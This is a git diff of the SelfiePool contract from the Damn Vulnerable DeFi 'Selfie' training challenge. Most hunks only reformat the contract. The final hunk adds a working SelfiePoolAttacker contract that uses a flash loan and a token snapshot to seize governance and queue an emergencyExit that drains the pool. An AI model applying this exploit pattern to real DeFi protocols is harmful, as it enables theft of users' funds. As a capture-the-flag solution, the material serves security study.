@@ -12,10 +12,10 @@ import "./SimpleGovernance.sol";
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
 contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
-
     ERC20Snapshot public immutable token;
     SimpleGovernance public immutable governance;
-    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     error RepayFailed();
     error CallerNotGovernance();
@@ -25,8 +25,7 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
     event FundsDrained(address indexed receiver, uint256 amount);
 
     modifier onlyGovernance() {
-        if (msg.sender != address(governance))
-            revert CallerNotGovernance();
+        if (msg.sender != address(governance)) revert CallerNotGovernance();
         _;
     }
 
@@ -36,14 +35,12 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
     }
 
     function maxFlashLoan(address _token) external view returns (uint256) {
-        if (address(token) == _token)
-            return token.balanceOf(address(this));
+        if (address(token) == _token) return token.balanceOf(address(this));
         return 0;
     }
 
     function flashFee(address _token, uint256) external view returns (uint256) {
-        if (address(token) != _token)
-            revert UnsupportedCurrency();
+        if (address(token) != _token) revert UnsupportedCurrency();
         return 0;
     }
 
@@ -53,16 +50,17 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
         uint256 _amount,
         bytes calldata _data
     ) external nonReentrant returns (bool) {
-        if (_token != address(token))
-            revert UnsupportedCurrency();
+        if (_token != address(token)) revert UnsupportedCurrency();
 
         token.transfer(address(_receiver), _amount);
-        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
-            revert CallbackFailed();
+        if (
+            _receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) !=
+            CALLBACK_SUCCESS
+        ) revert CallbackFailed();
 
         if (!token.transferFrom(address(_receiver), address(this), _amount))
             revert RepayFailed();
-        
+
         return true;
     }
 
@@ -71,5 +69,40 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
         token.transfer(receiver, amount);
 
         emit FundsDrained(receiver, amount);
+    }
+}
+
+contract SelfiePoolAttacker is IERC3156FlashBorrower {
+    SelfiePool pool;
+    DamnValuableTokenSnapshot snapshotToken;
+    SimpleGovernance governance;
+    address player;
+
+    constructor(SelfiePool _pool) {
+        pool = _pool;
+        snapshotToken = DamnValuableTokenSnapshot(address(pool.token()));
+        governance = pool.governance();
+        player = msg.sender;
+    }
+
+    function attack() public {
+        pool.flashLoan(this, address(snapshotToken), 1_500_000 ether, "");
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        snapshotToken.snapshot();
+        governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", player)
+        );
+        snapshotToken.approve(address(pool), 1_500_000 ether);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
